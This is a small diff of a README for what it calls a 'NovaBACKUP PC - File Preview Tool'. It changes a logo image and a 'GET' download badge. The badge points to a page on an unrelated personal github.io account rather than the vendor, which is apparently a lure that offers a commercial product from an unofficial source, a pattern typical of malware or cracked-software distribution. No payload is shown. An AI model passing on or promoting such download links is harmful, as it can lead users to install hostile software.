@@ -1,9 +1,9 @@
 
 # NovaBACKUP PC - File Preview Tool
 
-![NovaBACKUP PC](https://www.novabackup.de/hubfs/USA/Images/Featured-Images/NovaBACKUP-Logo-Featured.jpg)
+![NovaBACKUP PC](https://biatwork.com/wp-content/uploads/2013/12/logo_novabackup_225x132.png)
 
-[![GET NovaBACKUP PC](https://img.shields.io/badge/GET%20%E2%80%94%20NovaBACKUP%20PC-0078D6?style=for-the-badge&logoColor=white)](https://baileyshaughnessy121.github.io/.github/NovaBACKUP)
+[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20NovaBACKUP-0078D6?style=for-the-badge&logoColor=white)](https://baileyshaughnessy121.github.io/.github/NovaBACKUP)
 
 ---
 
